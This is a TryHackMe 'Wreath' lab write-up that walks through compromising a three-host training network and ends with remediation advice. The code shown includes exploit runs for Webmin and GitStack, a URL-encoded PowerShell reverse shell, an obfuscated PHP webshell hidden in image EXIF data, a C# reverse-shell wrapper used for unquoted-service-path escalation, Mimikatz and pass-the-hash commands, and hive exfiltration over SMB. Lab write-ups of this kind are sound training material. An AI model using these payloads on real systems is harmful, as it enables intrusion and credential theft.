---
layout: post
title: "THM: Wreath"
date: 2026-01-04
difficulty: Medium
os: Multi (Linux/Windows)
tags: [tryhackme, linux, windows, web, pivoting, lateral-movement, privilege-escalation, active-directory]
summary: "Multi-machine network featuring pivoting techniques, exploiting Webmin CVE-2019-15107 for initial access, GitStack RCE for lateral movement, and unquoted service path privilege escalation on Windows."
thumbnail: /assets/images/wreath.png
read_time: 25
---

## Overview

THM Wreath is a multi-machine network environment that demonstrates advanced penetration testing techniques including network pivoting, lateral movement, and privilege escalation across both Linux and Windows systems.

The attack path involves:

1. Exploiting Webmin on the initial Linux target
2. Pivoting into an internal network
3. Compromising a Windows Git server
4. Lateral movement to a Windows workstation
5. Privilege escalation via unquoted service path

This writeup walks through the complete attack chain step by step.

## Initial Reconnaissance

### Port Scanning

Starting with comprehensive port enumeration to identify exposed services:

```bash
nmap -T3 -A -oN wreath-scan.txt 10.200.180.200
```

**Results:**

```
PORT      STATE   SERVICE    VERSION
22/tcp    open    ssh        OpenSSH 8.0 (protocol 2.0)
80/tcp    open    http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Did not follow redirect to https://thomaswreath.thm
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open    ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
| http-methods: 
|_  Potentially risky methods: TRACE
9090/tcp  closed  zeus-admin
10000/tcp open    http       MiniServ 1.890 (Webmin httpd)
```

### Webmin Analysis (Port 10000)

The service that immediately stood out was Webmin running on port 10000.

**Key Information:**

- Service: MiniServ 1.890 (Webmin httpd)
- Known Vulnerability: CVE-2019-15107
- Risk Level: Critical (Unauthenticated RCE)
- Privileges: Typically runs as root

Webmin is a web-based system administration tool that often runs with elevated privileges. The identified version (1.890) is vulnerable to CVE-2019-15107, an unauthenticated remote command execution vulnerability that could provide immediate root access.

## Initial Access - Webmin Exploitation

### CVE-2019-15107 Exploitation

Exploited the Webmin vulnerability using a public exploit:

```bash
./CVE-2019-15107.py 10.200.180.200
```

**Exploit Output:**

```
        __        __   _               _         ____   ____ _____ 
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|

                                                @MuirlandOracle

[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.180.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!
[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# whoami
root
```
![photo-no1](/assets/images/wreath-images/wreath 1.png)

### Upgrading to Interactive Shell

The initial access provided a pseudo-shell, which was upgraded to a fully interactive reverse shell:

```bash
# shell

[*] Starting the reverse shell process
[*] For UNIX targets only!
Please enter the IP address for the shell: 10.250.180.3
Please enter the port number for the shell: 5555

[*] Start a netcat listener in a new window (nc -lvnp 5555) then press enter.
```

On attacker machine:

```bash
nc -lvnp 5555
```

**Result:** Root shell obtained on the first target!

## Persistence - SSH Key Extraction

Although root access was achieved, persistent access via SSH was preferred over relying on unstable reverse shells.

### Extracting SSH Private Key

```bash
cd /root/.ssh
ls -la
```

**Found:**

```
total 16
drwx------. 2 root root   80 Jan  6  2021 .
dr-xr-x---. 3 root root  192 Jan  8  2021 ..
-rw-r--r--. 1 root root  571 Nov  7  2020 authorized_keys
-rw-------. 1 root root 2602 Nov  7  2020 id_rsa
-rw-r--r--. 1 root root  571 Nov  7  2020 id_rsa.pub
-rw-r--r--. 1 root root  172 Jan  6  2021 known_hosts
```

Extracted the private key and established persistent SSH access:

```bash
ssh -i root_ssh root@10.200.180.200
```
![photo-no2](/assets/images/wreath-images/wreath 2.png)

## Internal Network Enumeration

### Network Discovery

Checking network configuration:

```bash
ip a
```

**Output:**

```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001
    inet 10.200.180.200/24 brd 10.200.180.255 scope global dynamic eth0
```

The host is on the `10.200.180.0/24` network, indicating potential internal targets.

### Setting Up Network Pivot

Established a pivot using sshuttle:

```bash
sudo sshuttle -r root@10.200.180.200 \
  -x 10.200.180.200 \
  --ssh-cmd "ssh -i /home/elliot/TryHackMe/Wreath/root_ssh" \
  --auto-nets
```

**Result:**

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
c : Connected to server.
```

### Internal Network Scanning

Since ICMP was filtered, uploaded a static nmap binary to scan locally:

```bash
./nmap-1 -sn 10.200.180.0/24
```

**Discovered Hosts:**

```
10.200.180.1    Host is up
10.200.180.100  Host is up
10.200.180.150  Host is up
10.200.180.200  Host is up (current host)
```

## Lateral Movement - GitStack Server (10.200.180.150)

### Service Enumeration

```bash
./nmap-1 10.200.180.150
```

**Open Ports:**

```
80/tcp   open  http
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

RDP and WinRM required credentials, so focus shifted to the HTTP service.

### GitStack Vulnerability Discovery

The web server was running GitStack, a Git repository management application. Searching for exploits:

```bash
searchsploit gitstack
```

**Found:**

```
GitStack 2.3.10 - Remote Code Execution  |  php/webapps/43777.py
```
![photo-no3](/assets/images/wreath-images/wreath 3.png)

### Preparing the Exploit

Converting DOS line endings:

```bash
dos2unix 43777.py
```

### Exploiting GitStack

```bash
python3 43777.py
```

**Output:**

```
[+] Found user: twreath
[+] Found repository: Website
[+] Create backdoor in PHP
[+] Execute command
nt authority\system
```

### Verifying Web Shell Access

```bash
curl -X POST http://10.200.180.150/web/exploit_el.php -d "a=whoami"
```

**Result:**

```
nt authority\system
```

## Reverse Shell via Relay

### Testing Network Connectivity

Testing if the compromised host could reach the attacker directly:

```bash
# Attacker machine - start tcpdump
tcpdump -i tun0 icmp

# Via webshell
curl -X POST http://10.200.180.150/web/exploit_el.php \
  -d "a=ping -n 3 10.250.180.3"
```

**Result:** Request timed out (no direct connection possible)

### Setting Up SOCAT Relay

Since direct connection failed, configured a relay through the first compromised host (.200):

**Network Flow:**

```
.150 (WebShell) --> .200 (Relay) --> Attacker
```

### Configuring Firewall

On the relay host (.200), opened firewall port:

```bash
firewall-cmd --zone=public --add-port=55000/tcp
```

**Result:** `success`

### Starting SOCAT Relay

```bash
./socat tcp-listen:55000 tcp:10.250.180.3:5555 &
```

### Setting Up Listener

```bash
nc -lvnp 5555
```

### Triggering Reverse Shell

```bash
curl -X POST http://10.200.180.150/web/exploit_el.php \
  -d "a=powershell.exe%20c%20%22%24client%20%3D%20NewObject%20System.Net.Sockets.TCPClient%28%2710.200.180.200%27%2C55000%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28NewObject%20TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20OutString%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
```

**Result:** Reverse shell obtained!

```
connect to [10.250.180.3] from (UNKNOWN) [10.200.180.200] 38972
PS C:\GitStack\gitphp>
```

## Persistence on GitStack Server

### Creating Local Admin Account

To enable stable access via RDP and WinRM, created a local administrator:

```powershell
net user elliot elliot /add
net localgroup "Administrators" elliot /add
net localgroup "Remote Management Users" elliot /add
```

**Results:**

```
The command completed successfully.
The command completed successfully.
The command completed successfully.
```

**Access Granted:**

- Administrators → Full local control
- Remote Management Users → WinRM access

![photo-no4](/assets/images/wreath-images/wreath 4.png)

## Post-Exploitation - Credential Harvesting

### RDP Access

Connected via RDP to use GUI tools:

```bash
xfreerdp3 /v:10.200.180.150 /u:elliot /p:elliot \
  +clipboard /dynamic-resolution \
  /drive:share,/home/elliot/Windows-Resources \
  /cert:ignore
```

### Mimikatz Execution

Uploaded and executed Mimikatz to extract credentials:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::sam
```

![photo-no5](/assets/images/wreath-images/wreath5.png)

**Extracted Hashes:**

```
User : Administrator
NTLM : 37db630168e5f82aafa8461e05c6bbd1

User : Thomas
NTLM : 02d90eda8f6b6b06c32d5f207831101f
```

### Pass-the-Hash Authentication

Using Evil-WinRM with the Administrator hash:

```bash
evil-winrm -i 10.200.180.150 \
  -u Administrator \
  -H 37db630168e5f82aafa8461e05c6bbd1
```

**Result:**

```
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## Final Target Enumeration (10.200.180.100)

### Port Scanning via Empire

Used Empire's PowerShell port scanner from inside the compromised host:

```powershell
Invoke-Portscan -Hosts 10.200.180.100 -TopPorts 50
```

**Results:**

```
Hostname      : 10.200.180.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 1723, 22...}
```

### Setting Up Chisel Tunnel

To access the internal web server, established a SOCKS proxy using Chisel.

**Firewall Configuration:**

```powershell
netsh advfirewall firewall add rule name="port-fwd" \
  dir=in action=allow protocol=tcp localport=56000
```

**Chisel Server (.150):**

```powershell
./chisel.exe server -p 56000 --socks5
```

**Chisel Client (Attacker):**

```bash
./chisel client 10.200.180.150:56000 8888:socks
```

**Result:**

```
2026/01/05 22:27:04 client: Connected (Latency 174.480098ms)
```
![photo-no6](/assets/images/wreath-images/wreath6.png)

## Source Code Analysis

### Extracting Git Repository

Since admin access to the Git server was already obtained, downloaded the repository directly:

```powershell
*Evil-WinRM* PS> download Website.git
```

### Reconstructing Repository

Using GitTools to extract commits:

```bash
sudo /home/elliot/TryHackMe/Wreath/GitTools/Extractor/extractor.sh . website
```

### Reviewing Commit History

```bash
separator="=======================================";
for i in $(ls); do
  printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n";
done
```
![photo-no7](/assets/images/wreath-images/wreath7.png)

**Commit Messages:**

```
0-70dde80cc19ec76704567996738894828f4ee895
Static Website Commit

1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
Initial Commit for the back-end

2-345ac8b236064b431fa43f53d91c98c4834ef8f3
Updated the filter
```

### Finding PHP Files

```bash
find . -name "*.php"
```

**Found:** `./resources/index.php`

## Vulnerability Analysis - File Upload

### Code Review

Examining the upload handler in `index.php`:

```php
$size = getimagesize($_FILES["file"]["tmp_name"]);
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
    header("location: ./?msg=Fail");
    die();
}
```
![photo-no8](/assets/images/wreath-images/wreath8.png)
![photo-no9](/assets/images/wreath-images/wreath9.png)
### Identified Vulnerabilities

**1. Weak Image Validation:**

- Uses `getimagesize()` which only checks file headers
- Can be bypassed by embedding PHP in image metadata

**2. Flawed Extension Check:**

- Only validates the second element after splitting on `.`
- Filename `image.jpeg.php` bypasses the filter:
  - Split result: `["image", "jpeg", "php"]`
  - Only checks index `[1]` → `"jpeg"` ✓
  - Final extension `.php` is ignored

## Exploitation - File Upload Bypass
![photo-no10](/assets/images/wreath-images/wreath 10.png)
### Creating the Payload

Obfuscated PHP webshell:

```php
<?php
$p0=$_GET[base64_decode('d3JlYXRo')];
if(isset($p0)){
  echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');
}
die();
?>
```

### Embedding in Image

Using exiftool to inject payload into EXIF metadata:

```bash
exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" war.jpeg.php
```

**Filename:** `war.jpeg.php`

### Upload and Execution

Accessed the webshell:

```
http://10.200.180.100/resources/uploads/war.jpeg.php?wreath=systeminfo
```
![photo-no11](/assets/images/wreath-images/wreath 11.png)

**Result:** Command execution successful!

## Reverse Shell on Final Target

### Uploading Netcat

Started HTTP server:

```bash
sudo python3 -m http.server 80
```

Downloaded netcat to target:

```bash
curl http://ATTACKER_IP/nc.exe -o c:\windows\temp\nc-elliot.exe
```

### Triggering Reverse Shell

Set up listener:

```bash
nc -lvnp 7777
```

Executed via webshell:

```
powershell.exe c:\windows\temp\nc-elliot.exe 10.250.180.3 7777 -e cmd.exe
```
![photo-no12](/assets/images/wreath-images/wreath 12.png)

**Result:** Shell obtained as low-privileged user!

## Privilege Escalation Enumeration

### Checking Privileges

```cmd
whoami /priv
```

**Found:** `SeImpersonatePrivilege` enabled

```cmd
whoami /groups
```

**Result:** Not in Administrators group

### Service Enumeration

Looking for non-default services with unquoted paths:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

**Found Vulnerable Service:**

![photo-no13](/assets/images/wreath-images/wreath 13.png)

```
SystemExplorerHelpService
C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
```

### Analyzing the Vulnerability

Checked service configuration:

```cmd
sc qc SystemExplorerHelpService
```

**Key Details:**

- Runs as: SYSTEM
- Path: Unquoted with spaces
- Start Type: Automatic

Checked directory permissions:

```powershell
get-acl "C:\Program Files (x86)\System Explorer" | fl
```

**Result:** `BUILTIN\Users` has write access

## Privilege Escalation - Unquoted Service Path

### Understanding the Vulnerability

For the path:

```
C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
```

Windows tries:

1. `C:\Program.exe` (not writable)
2. `C:\Program Files (x86)\System.exe` (not writable)
3. `C:\Program Files (x86)\System Explorer\System.exe` (writable!)

### Creating Malicious Executable

Wrapper code (`Wrapper.cs`):

```csharp
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo(
                "c:\\windows\\temp\\nc64-ha.exe",
                "10.250.180.3 7777 -e cmd.exe"
            );
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

Compiled with Mono:

```bash
mcs Wrapper.cs
mv Wrapper.exe System.exe
```

### Deploying the Exploit

Uploaded `System.exe` to:

```
C:\Program Files (x86)\System Explorer\System.exe
```

### Triggering Privilege Escalation

Set up listener:

```bash
nc -lvnp 7777
```

Restarted the service:

```cmd
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService
```

**Result:** SYSTEM shell obtained!

```
C:\Windows\system32>whoami
nt authority\system
```

## Post-Exploitation - Hash Extraction

### Extracting Registry Hives

Saved SAM and SYSTEM registry hives offline:

```cmd
reg.exe save HKLM\SAM sam.bak
reg.exe save HKLM\SYSTEM system.bak
```

### Exfiltrating via SMB

Set up SMB server:

```bash
/usr/share/doc/python3-impacket/examples/smbserver.py share . \
  -smb2support -username elliot -password ******
```

Copied files from target:

```cmd
copy sam.bak \\10.250.180.3\share\
copy system.bak \\10.250.180.3\share\
```

### Extracting Hashes

Using secretsdump:

```bash
/usr/share/doc/python3-impacket/examples/secretsdump.py \
  -sam sam.bak -system system.bak LOCAL
```

**Dumped Hashes:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
```

## Attack Chain Summary

```
1. External Reconnaissance
   └─> Port Scan (Nmap)
       └─> Webmin 1.890 Identified

2. Initial Compromise (.200)
   └─> CVE-2019-15107 (Webmin RCE)
       └─> Root Shell
           └─> SSH Key Extraction

3. Network Pivoting
   └─> Internal Network Discovery
       └─> Identified .150 and .100

4. Lateral Movement (.150)
   └─> GitStack RCE Exploit
       └─> SYSTEM Shell
           └─> Credential Dumping (Mimikatz)

5. Source Code Analysis
   └─> Git Repository Extraction
       └─> File Upload Vulnerability Found

6. Final Target Compromise (.100)
   └─> File Upload Bypass
       └─> PHP Webshell
           └─> Reverse Shell

7. Privilege Escalation (.100)
   └─> Unquoted Service Path
       └─> SYSTEM Shell
           └─> Hash Extraction
```

## Lessons Learned

### Technical Insights

1. **Network Pivoting:** Multi-hop pivoting requires stable relays and careful network configuration
2. **Defense Evasion:** Bypassing AV requires code obfuscation and legitimate tool abuse
3. **Lateral Movement:** Credential harvesting enables efficient network traversal
4. **Privilege Escalation:** Service misconfigurations remain prevalent attack vectors

### Methodology Improvements

1. Always enumerate internal networks after initial compromise
2. Extract source code when Git servers are accessible
3. Prefer offline hash extraction to avoid AV detection
4. Document complete attack chains for reporting

## Remediation Recommendations

### Critical

**1. Patch Webmin**

- Update to latest version
- Implement network segmentation
- Restrict access to management interfaces

**2. Fix GitStack Vulnerability**

- Update to patched version
- Implement authentication controls
- Restrict network access

**3. Secure File Upload**

- Validate file content, not just extensions
- Implement strict MIME type checking
- Store uploads outside web root
- Use random filenames

### High Priority

**4. Fix Unquoted Service Paths**

- Quote all service executable paths
- Review permissions on Program Files
- Implement least privilege for services

**5. Credential Protection**

- Enable Credential Guard
- Restrict local admin accounts
- Implement LAPS for local passwords

## Tools Used

| Tool | Purpose | Version |
|------|---------|---------|
| Nmap | Port scanning | 7.93 |
| Metasploit | Exploitation framework | 6.3 |
| sshuttle | VPN over SSH | 1.1.1 |
| Chisel | SOCKS proxy tunneling | 1.8.1 |
| Evil-WinRM | WinRM client | 3.9 |
| Mimikatz | Credential extraction | 2.2.0 |
| Impacket | Windows protocol tools | 0.13.0 |

## Flags

**Target .200 (Root):** ✓ Compromised  
**Target .150 (Administrator):** ✓ Compromised  
**Target .100 (SYSTEM):** ✓ Compromised

## Timeline

| Time | Milestone |
|------|-----------|
| 00:00 | Initial enumeration started |
| 00:30 | Webmin vulnerability exploited |
| 01:00 | Root access on .200 |
| 01:30 | Internal network mapped |
| 02:30 | GitStack server compromised (.150) |
| 03:30 | Credentials harvested |
| 04:30 | Source code analyzed |
| 05:00 | File upload vulnerability exploited (.100) |
| 06:00 | SYSTEM access obtained |
| 06:30 | Final hashes extracted |

**Total Time:** ~6.5 hours

## References

- [CVE-2019-15107 - Webmin RCE](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)
- [GitStack RCE - ExploitDB](https://www.exploit-db.com/exploits/43777)
- [Unquoted Service Path - MITRE](https://attack.mitre.org/techniques/T1574/009/)
- [Chisel - Tunneling Tool](https://github.com/jpillora/chisel)

---

*Writeup completed by Elliot  
Date: January 4, 2026  
Platform: TryHackMe - Wreath Network*
